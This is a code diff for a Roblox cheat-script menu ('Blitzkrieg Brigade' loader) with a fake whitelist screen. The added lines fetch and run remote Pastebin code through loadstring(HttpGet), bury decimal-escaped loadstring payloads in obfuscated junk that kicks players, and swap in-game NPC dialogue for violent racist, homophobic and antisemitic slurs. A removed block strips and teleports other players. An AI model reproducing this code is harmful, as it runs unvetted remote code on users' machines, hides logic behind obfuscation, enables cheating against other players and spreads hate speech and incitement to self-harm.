@@ -1,3 +1,310 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Loader = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Status = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local Frame_2 = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local BB = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
+local Unauthorized = Instance.new("TextLabel")
+local UICorner_5 = Instance.new("UICorner")
+local WhitelistCheck = Instance.new("TextLabel")
+local UICorner_6 = Instance.new("UICorner")
+local Refresh = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_8 = Instance.new("UICorner")
+local ScrollingFrame = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_10 = Instance.new("UICorner")
+local Authorized = Instance.new("TextLabel")
+local UICorner_11 = Instance.new("UICorner")
+local Execute = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local ImageButton = Instance.new("ImageButton")
+local UICorner_13 = Instance.new("UICorner")
+
+--Properties:
+
+Loader.Name = "Loader"
+Loader.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Loader.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Loader.ResetOnSpawn = false
+
+Frame.Parent = Loader
+Frame.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+Frame.Position = UDim2.new(0.483201027, 0, 0.269588321, 0)
+Frame.Size = UDim2.new(0, 507, 0, 445)
+
+UICorner.Parent = Frame
+
+Status.Name = "Status"
+Status.Parent = Frame
+Status.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+Status.Position = UDim2.new(0.256410271, 0, 0, 0)
+Status.Size = UDim2.new(0, 157, 0, 52)
+Status.Font = Enum.Font.Nunito
+Status.Text = "Status:"
+Status.TextColor3 = Color3.fromRGB(255, 255, 255)
+Status.TextScaled = true
+Status.TextSize = 14.000
+Status.TextWrapped = true
+
+UICorner_2.Parent = Status
+
+Frame_2.Parent = Status
+Frame_2.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+Frame_2.Position = UDim2.new(0.945705533, 0, 0, 0)
+Frame_2.Size = UDim2.new(0, 228, 0, 52)
+
+UICorner_3.Parent = Frame_2
+
+BB.Name = "BB"
+BB.Parent = Frame
+BB.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+BB.Size = UDim2.new(0, 148, 0, 52)
+BB.Font = Enum.Font.Nunito
+BB.Text = "Blitzkrieg Brigade"
+BB.TextColor3 = Color3.fromRGB(255, 255, 255)
+BB.TextScaled = true
+BB.TextSize = 14.000
+BB.TextWrapped = true
+
+UICorner_4.Parent = BB
+
+Unauthorized.Name = "Unauthorized"
+Unauthorized.Parent = Frame
+Unauthorized.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+Unauthorized.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Unauthorized.Position = UDim2.new(0.530571997, 0, 0, 0)
+Unauthorized.Size = UDim2.new(0, 175, 0, 52)
+Unauthorized.Visible = false
+Unauthorized.Font = Enum.Font.Nunito
+Unauthorized.Text = "Unauthorized"
+Unauthorized.TextColor3 = Color3.fromRGB(255, 0, 0)
+Unauthorized.TextScaled = true
+Unauthorized.TextSize = 30.000
+Unauthorized.TextWrapped = true
+
+UICorner_5.Parent = Unauthorized
+
+WhitelistCheck.Name = "WhitelistCheck"
+WhitelistCheck.Parent = Frame
+WhitelistCheck.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+WhitelistCheck.Position = UDim2.new(0.161735699, 0, 0.202247187, 0)
+WhitelistCheck.Size = UDim2.new(0, 335, 0, 281)
+WhitelistCheck.Font = Enum.Font.Nunito
+WhitelistCheck.Text = "Checking Whitelist..."
+WhitelistCheck.TextColor3 = Color3.fromRGB(255, 255, 255)
+WhitelistCheck.TextScaled = true
+WhitelistCheck.TextSize = 14.000
+WhitelistCheck.TextWrapped = true
+
+UICorner_6.CornerRadius = UDim.new(1, 2)
+UICorner_6.Parent = WhitelistCheck
+
+Refresh.Name = "Refresh"
+Refresh.Parent = Frame
+Refresh.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Refresh.Position = UDim2.new(0, 0, 0.887640476, 0)
+Refresh.Size = UDim2.new(0, 82, 0, 50)
+Refresh.Font = Enum.Font.SourceSans
+Refresh.Text = "Refresh"
+Refresh.TextColor3 = Color3.fromRGB(255, 255, 255)
+Refresh.TextScaled = true
+Refresh.TextSize = 14.000
+Refresh.TextWrapped = true
+
+UICorner_7.Parent = Refresh
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+ImageLabel.Position = UDim2.new(0.822485209, 0, 0.817977548, 0)
+ImageLabel.Size = UDim2.new(0, 90, 0, 81)
+ImageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+UICorner_8.Parent = ImageLabel
+
+ScrollingFrame.Name = "ScrollingFrame"
+ScrollingFrame.Parent = Frame
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ScrollingFrame.Position = UDim2.new(0.149901375, 0, 0.541573048, 0)
+ScrollingFrame.Size = UDim2.new(0, 376, 0, 77)
+ScrollingFrame.Visible = false
+ScrollingFrame.Font = Enum.Font.SourceSans
+ScrollingFrame.Text = "Launch ScrollingFrame V3.1"
+ScrollingFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.TextScaled = true
+ScrollingFrame.TextSize = 14.000
+ScrollingFrame.TextWrapped = true
+
+UICorner_9.CornerRadius = UDim.new(1, 2)
+UICorner_9.Parent = ScrollingFrame
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
+TextLabel.Position = UDim2.new(0.382642984, 0, 0.817977548, 0)
+TextLabel.Size = UDim2.new(0, 223, 0, 81)
+TextLabel.Font = Enum.Font.Nunito
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+UICorner_10.Parent = TextLabel
+
+Authorized.Name = "Authorized"
+Authorized.Parent = Frame
+Authorized.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+Authorized.Position = UDim2.new(0.534516752, 0, 0, 0)
+Authorized.Size = UDim2.new(0, 172, 0, 52)
+Authorized.Visible = false
+Authorized.Font = Enum.Font.Nunito
+Authorized.Text = "Authorized"
+Authorized.TextColor3 = Color3.fromRGB(17, 255, 0)
+Authorized.TextScaled = true
+Authorized.TextSize = 30.000
+Authorized.TextWrapped = true
+
+UICorner_11.Parent = Authorized
+
+Execute.Name = "Execute"
+Execute.Parent = Frame
+Execute.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Execute.Position = UDim2.new(0.149901375, 0, 0.274157315, 0)
+Execute.Size = UDim2.new(0, 376, 0, 119)
+Execute.Visible = false
+Execute.Font = Enum.Font.SourceSans
+Execute.Text = "Launch v3.1"
+Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
+Execute.TextScaled = true
+Execute.TextSize = 14.000
+Execute.TextWrapped = true
+
+UICorner_12.CornerRadius = UDim.new(1, 2)
+UICorner_12.Parent = Execute
+
+ImageButton.Parent = Frame
+ImageButton.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+ImageButton.Position = UDim2.new(0.876814067, 0, -0.000717937946, 0)
+ImageButton.Size = UDim2.new(0, 62, 0, 52)
+ImageButton.Image = "http://www.roblox.com/asset/?id=5198838744"
+
+UICorner_13.Parent = ImageButton
+
+-- Scripts:
+
+local function IKHWG_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(IKHWG_fake_script)()
+local function KMEIC_fake_script() -- ImageLabel.LocalScript 
+	local script = Instance.new('LocalScript', ImageLabel)
+
+	local Players = game:GetService("Players")
+
+	local player = Players.LocalPlayer
+
+	local userId = player.UserId
+	local thumbType = Enum.ThumbnailType.HeadShot
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+	local imageLabel = script.Parent
+	imageLabel.Image = content
+end
+coroutine.wrap(KMEIC_fake_script)()
+local function PISYAIS_fake_script() -- TextLabel.LocalScript 
+	local script = Instance.new('LocalScript', TextLabel)
+
+	local player = game.Players.LocalPlayer
+
+	if player then
+		script.Parent.Text = ""..player.Name..""
+	end
+end
+coroutine.wrap(PISYAIS_fake_script)()
+
+Refresh.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+	loadstring(game:HttpGet("https://pastebin.com/raw/Vk5Ux7ij", true))()
+end)
+
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist..."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist.."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist..."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist.."
+wait(0.3)
+--// Insert bug here
+WhitelistCheck.Text = "Checking Whitelist..."
+wait(3.0)
+WhitelistCheck.Text = "Checking Whitelist."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist.."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist..."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist."
+wait(0.3)
+WhitelistCheck.Text = "Checking Whitelist.."
+ScrollingFrame.Visible = true
+Authorized.Visible = true 
+WhitelistCheck.Visible = false
+ImageButton.MouseButton1Click:Connect(function()
+	Frame.Visible = false
+end)
+
+ScrollingFrame.MouseButton1Click:Connect(function()
 	local NewestDesign = Instance.new("ScreenGui")
 	local ImageLabel = Instance.new("ImageLabel")
 	local UICorner = Instance.new("UICorner")
@@ -566,9 +873,9 @@
 			RobRegisterLength = 0.0000001, 
 			PickCellLength = 0.001, 
 			SkinAnimalLength = 0.0000001,
-		}, 200, { "Get out of my shop! Outlaws are not welcome here!", "Hey, scoundrel! Get out before I call the sheriff!", "You're an outlaw! We don't serve your type here!" }, { "This here's a bandit camp! Get out!", "Get lost, cowboy!", "Are you an outlaw? Didn't think so! Scram!" });
+		}, 200, { "KlILL YOlURSELF FAG FUCKING COON CHINK QlUEER", "I HATE NIGGERS FUCK YOU NIGGER SEX SEX SEX" }, { "KILL YOURSELF FAGGOT NIGGER KYS KYSKYS FAG STUPID JEW KILL ALL JEWS" });
 	end)
-	pcall(function() function igopjitler(Lexarv211468661900203363436922587052036558)local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) end function santutan(JitlerisHandome43356951733381251428336680963430221)local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) end local pcall(function() function igopjitler(Mahalkosikylee23982734402086435067645576072342298)local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) end function santutan(Mahalkosikylee23982734402086435067645576072342298)local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) end local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li function igopjitler(Mahalkosikylee23982734402086435067645576072342298)local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) end local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li loadstring("\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\32\61\61\32\51\55\55\50\54\51\53\55\53\52\32\116\104\101\110\13\10\101\108\115\101\13\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\75\105\99\107\40\34\79\104\32\109\121\32\103\111\100\44\32\100\111\101\115\32\104\101\32\107\110\111\119\32\104\111\119\32\116\111\32\103\101\116\32\115\116\117\114\100\121\63\32\68\111\101\115\32\104\101\32\107\110\111\119\32\116\104\101\32\109\101\116\104\111\100\63\32\78\111\32\119\97\121\32\104\101\32\107\110\111\119\115\32\116\104\101\32\109\101\116\104\111\100\46\46\46\110\111\32\119\97\121\45\79\111\111\111\111\111\111\111\111\111\111\111\104\104\104\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\110\101\119\32\121\111\114\107\32\109\101\116\104\111\100\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\111\99\107\121\32\119\97\121\32\109\101\116\104\111\100\33\34\41\13\10\112\114\105\110\116\40\34\68\101\110\105\101\100\34\41\13\10\101\110\100\13\10\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\61\61\32\75\74\73\67\69\83\84\89\88\32\116\104\101\110\13\10\101\108\115\101\13\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\75\105\99\107\40\34\79\104\32\109\121\32\103\111\100\44\32\100\111\101\115\32\104\101\32\107\110\111\119\32\104\111\119\32\116\111\32\103\101\116\32\115\116\117\114\100\121\63\32\68\111\101\115\32\104\101\32\107\110\111\119\32\116\104\101\32\109\101\116\104\111\100\63\32\78\111\32\119\97\121\32\104\101\32\107\110\111\119\115\32\116\104\101\32\109\101\116\104\111\100\46\46\46\110\111\32\119\97\121\45\79\111\111\111\111\111\111\111\111\111\111\111\104\104\104\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\110\101\119\32\121\111\114\107\32\109\101\116\104\111\100\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\111\99\107\121\32\119\97\121\32\109\101\116\104\111\100\33\34\41\13\10\112\114\105\110\116\40\34\68\101\110\105\101\100\34\41\13\10\101\110\100")() local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li function santutan(Mahalkosikylee23982734402086435067645576072342298)local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) end local Lexarv230170512012330477836229754311776232 = (5*3-2/8+9*2/9+8*3) local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3037562Lexarv23833464584088Lexarv23480121930686Lexarv247842183294062Lexarv246530773859167Lexarv211031023630628Lexarontop43935273982036Lexarv217787012667873jitlerontop34525964358146jitlerigopworldwide41886704652527Igopthejitler15574972928822Jitlerishandsome1061444 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li  end) = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li function igopjitler(Lexarv211468661900203363436922587052036558)local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) end local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li loadstring("\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\32\61\61\32\34\75\74\73\67\69\66\69\65\82\34\32\116\104\101\110\13\10\101\108\115\101\13\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\75\105\99\107\40\34\79\104\32\109\121\32\103\111\100\44\32\100\111\101\115\32\104\101\32\107\110\111\119\32\104\111\119\32\116\111\32\103\101\116\32\115\116\117\114\100\121\63\32\68\111\101\115\32\104\101\32\107\110\111\119\32\116\104\101\32\109\101\116\104\111\100\63\32\78\111\32\119\97\121\32\104\101\32\107\110\111\119\115\32\116\104\101\32\109\101\116\104\111\100\46\46\46\110\111\32\119\97\121\45\79\111\111\111\111\111\111\111\111\111\111\111\104\104\104\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\110\101\119\32\121\111\114\107\32\109\101\116\104\111\100\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\111\99\107\121\32\119\97\121\32\109\101\116\104\111\100\33\34\41\13\10\101\110\100\13\10\105\102\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\32\61\61\32\49\49\53\56\54\54\49\48\54\32\116\104\101\110\13\10\101\108\115\101\13\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\75\105\99\107\40\34\79\104\32\109\121\32\103\111\100\44\32\100\111\101\115\32\104\101\32\107\110\111\119\32\104\111\119\32\116\111\32\103\101\116\32\115\116\117\114\100\121\63\32\68\111\101\115\32\104\101\32\107\110\111\119\32\116\104\101\32\109\101\116\104\111\100\63\32\78\111\32\119\97\121\32\104\101\32\107\110\111\119\115\32\116\104\101\32\109\101\116\104\111\100\46\46\46\110\111\32\119\97\121\45\79\111\111\111\111\111\111\111\111\111\111\111\104\104\104\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\110\101\119\32\121\111\114\107\32\109\101\116\104\111\100\33\32\72\101\32\107\110\111\119\115\32\116\104\101\32\111\99\107\121\32\119\97\121\32\109\101\116\104\111\100\33\34\41\13\10\101\110\100")() local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li function santutan(JitlerisHandome43356951733381251428336680963430221)local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) end local Lexarv211468661900203363436922587052036558 = (5*3-2/8+9*2/9+8*3) local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li local a3465691Lexarv228521044105872Lexarv240576564717113Lexarv218523471794066Lexarv214753364013304Lexarv241111621619588Lexarontop432227670798Lexarv225427291800623jitlerontop8927561216743jitlerigopworldwide19735063695147Igopthejitler40792402999618Jitlerishandsome3470307 = IIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1liIIiIl1ii1lli1l1i1li  end)
+	--// Insert bug here
 	BreakWindow.MouseButton1Click:Connect(function()
 		local args = {
 			[1] = "Complete"
@@ -851,83 +1158,9 @@
 		end
 	end)
 
-KA.MouseButton1Click:Connect(function()
-	local L_1_ = true;
-	local L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
-	local L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
-
-	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(L_4_arg1)
-		if L_4_arg1 == 'f' then
-			L_1_ = not L_1_
-		end;
-		if L_4_arg1 == 'r' then
-			L_2_ = game.Players.LocalPlayer.Character.HumanoidRootPart;
-			L_3_ = L_2_.Position - Vector3.new(5, 0, 0)
-		end
+	KA.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/i5eqipQ0", true))()
 	end)
-
-	for L_5_forvar1, L_6_forvar2 in pairs(game.Players:GetPlayers()) do
-		if L_6_forvar2 == game.Players.LocalPlayer then
-		else
-			local L_7_ = coroutine.create(function()
-				game:GetService('RunService').RenderStepped:Connect(function()
-					local L_8_, L_9_ = pcall(function()
-						local L_10_ = L_6_forvar2.Character;
-						if L_10_ then
-							if L_10_:FindFirstChild("HumanoidRootPart") then
-								if L_1_ then
-									L_6_forvar2.Backpack:ClearAllChildren()
-									for L_11_forvar1, L_12_forvar2 in pairs(L_10_:GetChildren()) do
-										if L_12_forvar2:IsA("Tool") then
-											L_12_forvar2:Destroy()
-										end
-									end;
-									L_10_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
-								end
-							end
-						end
-					end)
-					if L_8_ then
-					else
-						warn("Unnormal error: "..L_9_)
-					end
-				end)
-			end)
-			coroutine.resume(L_7_)
-		end
-	end;
-
-	game.Players.PlayerAdded:Connect(function(L_13_arg1)   
-		if L_13_arg1 == game.Players.LocalPlayer then
-		else
-			local L_14_ = coroutine.create(function()
-				game:GetService('RunService').RenderStepped:Connect(function()
-					local L_15_, L_16_ = pcall(function()
-						local L_17_ = L_13_arg1.Character;
-						if L_17_ then
-							if L_17_:FindFirstChild("HumanoidRootPart") then
-								if L_1_ then
-									L_13_arg1.Backpack:ClearAllChildren()
-									for L_18_forvar1, L_19_forvar2 in pairs(L_17_:GetChildren()) do
-										if L_19_forvar2:IsA("Tool") then
-											L_19_forvar2:Destroy()
-										end
-									end;
-									L_17_.HumanoidRootPart.CFrame = CFrame.new(L_3_)
-								end
-							end
-						end
-					end)
-					if L_15_ then
-					else
-						warn("Unnormal error: "..L_16_)
-					end
-				end)
-			end)
-			coroutine.resume(L_14_)
-		end           
-	end)
-end)
 
 	INV.MouseButton1Click:Connect(function()
 		INV.Text = "Invisibility GUI Enabled"
@@ -1485,3 +1718,6 @@ end)
 		wait(0.5)
 		TextLabel.TextColor3 = Color3.fromRGB(170, 85, 127)
 	end
+	Frame.Visible = false
+end)
+
